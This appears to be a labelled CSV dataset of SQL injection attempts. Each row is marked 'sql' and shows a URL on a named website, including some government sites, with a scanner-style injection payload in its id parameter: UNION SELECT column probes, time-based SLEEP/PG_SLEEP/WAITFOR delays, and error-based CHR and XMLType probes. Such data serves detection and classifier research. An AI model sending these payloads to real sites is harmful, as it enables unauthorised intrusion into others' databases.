,language,source"
1,sql,"http : / / www . romanianwriters . ro / s . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL - - vGXN"
2,sql,"http : / / www . bible - history . com / subcat . php ? id = 1;SELECT PG_SLEEP ( 5 ) - - "
3,sql,"http : / / ruscongrmech2015 . ru / index . php ? id = 1 ' ) AND SLEEP ( 5 ) AND ( ' GJyr ' = ' GJyr"
4,sql,"http : / / berkeleyrecycling . org / page . php ? id = 1 ' ) AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) AND ( ' VgiB ' = ' VgiB"
5,sql,"http : / / www . xrayrisk . com / calculator / calculator - normal - studies . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL - - Lunn"
6,sql,"http : / / 193 . 232 . 218 . 56 / web - local / prep / rj / index . php ? id = 1 % ' AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ' % ' = ' "
8,sql,"https : / / www . fleurlis . com . tw / en / wedding . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL - - IshX"
9,sql,"http : / / www . dipintoguitars . com / category . php ? id = 1 ) UNION ALL SELECT NULL - - fqfI"
10,sql,"http : / / www . teamgear . us / store . php ? id = 1 ) UNION ALL SELECT NULL , NULL - - EXrh"
11,sql,"http : / / www . multan . gov . pk / files . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL - - fKpc"
12,sql,"http : / / www . asfaa . org / members . php ? id = 1 ' ) AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( ' bARY ' = ' bARY"
13,sql,"http : / / www . bpc . gov . bd / contactus . php ? id = 1 ORDER BY 4721 - - gPsZ"
14,sql,"https : / / metacarpolis . com / index . php ? id = 1 AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) - - sFCM"
15,sql,"http : / / www . jbctools . com / cataleg . php ? id = 1 ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - CEEX"
17,sql,"http : / / ansobor . ru / page . php ? id = ( SELECT ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 2394 = 2394 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) ) "
18,sql,"http : / / www . khrunichev . ru / main . php ? id = 1 ) AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) AND ( 9475 = 9475"
19,sql,"http : / / www . studentvote . ca / 2011 / results / index . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL - - SOSW"
20,sql,"https : / / www . orthphoto . net / user . php ? id = 1 ' ) AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( ' bARY ' = ' bARY"
21,sql,"http : / / esjindex . org / search . php ? id = 1 AND 2076 = 1452 - - zXSW"
22,sql,"http : / / www . sansihotels . com / hotels . php ? id = 1;WAITFOR DELAY ' 0 : 0 : 5 ' - - "
23,sql,"http : / / www . adopfrance . fr / gb / galerie / index . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL - - mqyP"
24,sql,"http : / / www . akko . org . il / map_en . php ? id = 1 ' AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ' VCNg ' = ' VCNg"
25,sql,"http : / / www . paranatural . net / index . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - dLhL"
26,sql,"http : / / www . photobiology . org / asp . php ? id = 1 ) ORDER BY 1 - - zRhc"
29,sql,"http : / / www . stateofdesign . berlin / subevents . php ? id = 1 ' ;SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 84 ) | | CHR ( 106 ) | | CHR ( 102 ) | | CHR ( 83 ) , 5 ) FROM DUAL - - "
30,sql,"https : / / www . acme . in / contentpage . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - BMLy"
31,sql,"http : / / www . komiaviatrans . ru / airport / index . php ? id = 1 AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) - - VWJB"
32,sql,"http : / / www . cdep . ru / index . php ? id = 1 % ' AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) AND ' % ' = ' "
33,sql,"http : / / www . peml . com / login . php ? rtn_url = http : / / www . peml . com / category . php ? id = 1 AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) - - sFCM"
34,sql,"http : / / www . palfi . net / partners . php ? id = 1 AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) "
35,sql,"http : / / www . sabella . fr / fiche . php ? id = 1 ' AND 3611 = 3611 AND ' oygD ' = ' oygD"
36,sql,"http : / / electronautomotive . com / order . php ? id = 1 ORDER BY 1 - - lAea"
37,sql,"http : / / en . firenze - online . com / shops / florence - shop . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL - - fKpc"
38,sql,"http : / / www . pidsphil . org / journal_info . php ? id = ( SELECT CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 5838 = 5838 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) "
39,sql,"http : / / www . egscomics . com / index . php ? id = 1 ' NKZqCS< ' ">bIRAbA"
40,sql,"https : / / 100wonders . ru / index . php ? id = ( SELECT ( CASE WHEN ( 9362 = 8798 ) THEN 9362 ELSE 9362* ( SELECT 9362 FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
41,sql,"http : / / www . ifsb . org / membership . php ? id = 1 ) AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ( 9963 = 9963"
42,sql,"https : / / www . ocsalumni . org / events / cart . php ? id = 1 % ' AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ' % ' = ' "
43,sql,"http : / / www . ssy . org / detail . php ? id = 1 ' ORDER BY 1 - - Hgvf"
44,sql,"http : / / www . micwaudio . com / product . php ? id = 1 AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) "
45,sql,"http : / / www . smart - ground . eu / partner . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL - - Dvxx"
46,sql,"http : / / www . lambbuilding . co . uk / members / profile . php ? id = 1 % ' AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ' % ' = ' "
47,sql,"http : / / www . minutesemeiotic . org / home . php ? id = 1;SELECT PG_SLEEP ( 5 ) - - "
48,sql,"http : / / pedlib . ru / katalogy / katalog . php ? id = 1 ' ) AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) AND ( ' mQhu ' = ' mQhu"
49,sql,"http : / / bestindustrygroup . com / news . php ? id = 1 ) AND 3611 = 3611 AND ( 5554 = 5554"
50,sql,"http : / / cityvis . io / detail . php ? id = 1 ' AND 3611 = 3611 AND ' oygD ' = ' oygD"
51,sql,"http : / / www . fairtradegroupnepal . org / about . php ? id = 1 AND SLEEP ( 5 ) - - THvg"
52,sql,"http : / / www . cacert . org / index . php ? id = 1 ' ) ORDER BY 1 - - tslS"
53,sql,"http : / / koshi . fr / achat / produit_details . php ? id = 1 ) ;SELECT PG_SLEEP ( 5 ) - - "
54,sql,"http : / / vlab . co . in / ba_labs_all . php ? id = 1 ) ;SELECT PG_SLEEP ( 5 ) - - "
55,sql,"http : / / ewfed . com / cat . php ? id = 1 ) ;SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 84 ) | | CHR ( 106 ) | | CHR ( 102 ) | | CHR ( 83 ) , 5 ) FROM DUAL - - "
56,sql,"https : / / www . kunstreservebank . nl / index . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - wXih"
57,sql,"http : / / www . cqfa . ca / public / index . php ? id = 1 ' ) ORDER BY 1 - - tslS"
58,sql,"https : / / www . free - country - flags . com / flag_pack . php ? id = 1 ' ) ORDER BY 1 - - tslS"
59,sql,"http : / / www . carrot - home . com / project . php ? id = 1 ) AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ( 9963 = 9963"
60,sql,"https : / / www . partnerschulnetz . de / index . php ? id = ( SELECT ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 2394 = 2394 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) ) "
61,sql,"https : / / www . albinagroup . com / products . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - JiPD"
62,sql,"http : / / modniditky . com / katalog . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL - - lXro"
63,sql,"http : / / www . evanscartoons . com / gallery . php ? id = 1 AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) - - Qmvu"
64,sql,"http : / / paritarian - funds - construction . eu / page . php ? id = 1 ' AND 7019 = 2399 AND ' bmfB ' = ' bmfB"
65,sql,"https : / / www . jannah . ae / hotels . php ? id = 1 AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) "
66,sql,"http : / / www . nm . cz / publikace / publikace - detail - en . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL - - rvrn"
67,sql,"http : / / xn - - 149 - 5cd9ame0ai0a4e5b . xn - - p1ai / page . php ? id = 1 ' ) AND 3611 = 3611 AND ( ' xpHU ' = ' xpHU"
68,sql,"http : / / www . daiichisankyo . co . th / aboutus . php ? id = ( SELECT ( CASE WHEN ( 3684 = 3684 ) THEN 3684 ELSE 3684* ( SELECT 3684 FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
69,sql,"http : / / www . epomm . eu / maxeva / index . php ? id = 1 ) AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ( 9963 = 9963"
70,sql,"http : / / www . skystartravels . com / gallery . php ? id = 1 % ' AND 3611 = 3611 AND ' % ' = ' "
72,sql,"http : / / www . sakhalinprokur . ru / contacts . php ? id = 1 % ' AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) AND ' % ' = ' "
